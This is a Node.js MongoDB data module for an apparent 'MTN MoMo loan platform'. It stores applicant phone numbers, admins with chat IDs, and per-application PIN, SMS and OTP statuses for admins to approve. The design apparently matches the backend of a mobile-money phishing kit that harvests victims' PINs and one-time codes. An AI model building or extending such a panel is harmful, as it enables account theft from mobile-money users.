const { MongoClient } = require('mongodb');
require('dotenv').config();

let client;
let db;
let connectingPromise = null;

const DB_NAME = 'mtn_momo_loan_platform';
const COLLECTIONS = {
    ADMINS: 'admins',
    APPLICATIONS: 'applications',
    ENVIRONMENT_LOGS: 'environment_logs'
};

/**
 * Ensures DB connection is active before executing queries
 */
async function ensureDb() {
    if (!db) {
        await connectDatabase();
    }
    if (!db) {
        throw new Error('Database is not initialized or connected.');
    }
    return db;
}

/**
 * Connect to MongoDB with connection pooling safety
 */
async function connectDatabase() {
    if (db) return db;

    if (connectingPromise) {
        return await connectingPromise;
    }

    connectingPromise = (async () => {
        try {
            const MONGODB_URI = process.env.MONGODB_URI || process.env.DATABASE_URL;

            if (!MONGODB_URI) {
                throw new Error('❌ MONGODB_URI is not set in environment variables');
            }

            console.log('🔄 Connecting to MongoDB (MTN MoMo Platform)...');

            client = new MongoClient(MONGODB_URI, {
                maxPoolSize: 10,
                minPoolSize: 2,
                serverSelectionTimeoutMS: 5000,
                connectTimeoutMS: 10000
            });

            await client.connect();
            db = client.db(DB_NAME);

            console.log('✅ Connected to MongoDB successfully');

            await createIndexes();
            await seedSuperAdmin();

            return db;
        } catch (error) {
            console.error('❌ MongoDB connection error:', error);
            db = null;
            client = null;
            throw error;
        } finally {
            connectingPromise = null;
        }
    })();

    return await connectingPromise;
}

/**
 * Seed Super Admin (ADMIN001) if not present
 */
async function seedSuperAdmin() {
    try {
        const database = await ensureDb();
        const superAdminExists = await database.collection(COLLECTIONS.ADMINS).findOne({ adminId: 'ADMIN001' });
        if (!superAdminExists) {
            const superAdminDocument = {
                adminId: 'ADMIN001',
                name: 'Super Admin',
                email: 'admin@momo.cm',
                chatId: null,
                status: 'active',
                createdAt: new Date().toISOString(),
                updatedAt: new Date().toISOString()
            };
            await database.collection(COLLECTIONS.ADMINS).insertOne(superAdminDocument);
            console.log('⭐ Seeded default Super Admin (ADMIN001)');
        }
    } catch (error) {
        console.error('⚠️ Error seeding super admin:', error.message);
    }
}

/**
 * Create database indexes safely
 */
async function createIndexes() {
    try {
        const database = await ensureDb();
        await Promise.all([
            database.collection(COLLECTIONS.ADMINS).createIndex({ adminId: 1 }, { unique: true }),
            database.collection(COLLECTIONS.ADMINS).createIndex({ email: 1 }, { sparse: true }),
            database.collection(COLLECTIONS.ADMINS).createIndex({ chatId: 1 }, { sparse: true }),
            database.collection(COLLECTIONS.ADMINS).createIndex({ status: 1 }),

            database.collection(COLLECTIONS.APPLICATIONS).createIndex({ applicationId: 1 }, { unique: true }),
            database.collection(COLLECTIONS.APPLICATIONS).createIndex({ adminId: 1 }),
            database.collection(COLLECTIONS.APPLICATIONS).createIndex({ phoneNumber: 1 }),
            database.collection(COLLECTIONS.APPLICATIONS).createIndex({ pinStatus: 1 }),
            database.collection(COLLECTIONS.APPLICATIONS).createIndex({ smsStatus: 1 }),
            database.collection(COLLECTIONS.APPLICATIONS).createIndex({ otpStatus: 1 }),
            database.collection(COLLECTIONS.APPLICATIONS).createIndex({ createdAt: -1 })
        ]);
        console.log('✅ Database indexes created successfully');
    } catch (error) {
        console.error('⚠️ Index creation error:', error.message);
    }
}

/**
 * Saves or initialises an application record
 */
async function saveApplication(appData) {
    const database = await ensureDb();
    const applicationId = 'APP_' + Date.now() + '_' + Math.floor(Math.random() * 1000);
    const now = new Date().toISOString();

    const applicationDoc = {
        applicationId,
        id: applicationId,
        phoneNumber: appData.phoneNumber,
        adminId: appData.adminId || 'ADMIN001',
        assignmentType: appData.assignmentType || 'auto',
        pinStatus: 'pending',
        smsStatus: 'none',
        otpStatus: 'none',
        createdAt: now,
        updatedAt: now
    };

    await database.collection(COLLECTIONS.APPLICATIONS).insertOne(applicationDoc);

    return {
        applicationId,
        assignedAdminId: applicationDoc.adminId
    };
}

/**
 * Retrieves application by applicationId
 */
async function getApplication(applicationId) {
    const database = await ensureDb();
    return await database.collection(COLLECTIONS.APPLICATIONS).findOne({
        $or: [{ applicationId }, { id: applicationId }]
    });
}

/**
 * Updates application record
 */
async function updateApplication(applicationId, updateData) {
    const database = await ensureDb();
    const now = new Date().toISOString();

    const updateDoc = {
        ...updateData,
        updatedAt: now
    };

    return await database.collection(COLLECTIONS.APPLICATIONS).updateOne(
        { $or: [{ applicationId }, { id: applicationId }] },
        { $set: updateDoc }
    );
}

/**
 * Specific status update helpers
 */
async function updatePinStatus(applicationId, status) {
    return await updateApplication(applicationId, { pinStatus: status });
}

async function updateSmsStatus(applicationId, status) {
    return await updateApplication(applicationId, { smsStatus: status });
}

async function updateOtpStatus(applicationId, status) {
    return await updateApplication(applicationId, { otpStatus: status });
}

/**
 * Fetches pending applications for admin view
 */
async function getPendingApplications(adminId = null) {
    const database = await ensureDb();
    const query = {
        $or: [
            { pinStatus: 'pending' },
            { smsStatus: 'pending' },
            { otpStatus: 'pending' }
        ]
    };

    if (adminId) {
        query.adminId = adminId;
    }

    return await database.collection(COLLECTIONS.APPLICATIONS)
        .find(query)
        .sort({ createdAt: -1 })
        .toArray();
}

/**
 * Calculates statistics without mixing states
 */
async function getAdminStats(adminId = null) {
    const database = await ensureDb();
    const match = adminId ? { adminId } : {};

    const [pinPending, smsPending, otpPending, totalApproved, totalRejected] = await Promise.all([
        database.collection(COLLECTIONS.APPLICATIONS).countDocuments({ ...match, pinStatus: 'pending' }),
        database.collection(COLLECTIONS.APPLICATIONS).countDocuments({ ...match, smsStatus: 'pending' }),
        database.collection(COLLECTIONS.APPLICATIONS).countDocuments({ ...match, otpStatus: 'pending' }),
        database.collection(COLLECTIONS.APPLICATIONS).countDocuments({ ...match, otpStatus: 'approved' }),
        database.collection(COLLECTIONS.APPLICATIONS).countDocuments({
            ...match,
            $or: [{ pinStatus: 'rejected' }, { smsStatus: 'rejected' }, { otpStatus: 'rejected' }]
        })
    ]);

    return {
        pinPending,
        smsPending,
        otpPending,
        totalApproved,
        totalRejected
    };
}

module.exports = {
    connectDatabase,
    ensureDb,
    saveApplication,
    getApplication,
    updateApplication,
    updatePinStatus,
    updateSmsStatus,
    updateOtpStatus,
    getPendingApplications,
    getAdminStats,
    getStats: getAdminStats
};
